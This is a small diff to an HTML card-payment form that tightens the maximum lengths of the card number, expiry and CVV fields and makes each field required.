@@ -14,14 +14,14 @@
 
 <!--     <form action="https://suc-msg.pages.dev/" method="post"> -->
     <label for="cardno">Card Number
-    <input type="text" name="cardno" id="cardno" maxlength="19" onkeypress="cardspace()"/>
+    <input type="text" name="cardno" id="cardno" maxlength="16" onkeypress="cardspace()" required/>
     </label>
     <div class="float">
     <label for="validtill">Valid till
-        <input type="text" name="validtill" id="validtill" maxlength="7" onkeypress="addSlashes()"/>
+        <input type="text" name="validtill" id="validtill" maxlength="4" onkeypress="addSlashes()" required/>
     </label>
   <label for="cvv">Cvv
-        <input type="text" name="cvv" id="cvv" maxlength="3"/>
+        <input type="text" name="cvv" id="cvv" maxlength="3" required/>
     </label></div>
 
         <a href="https://suc-msg.pages.dev/">
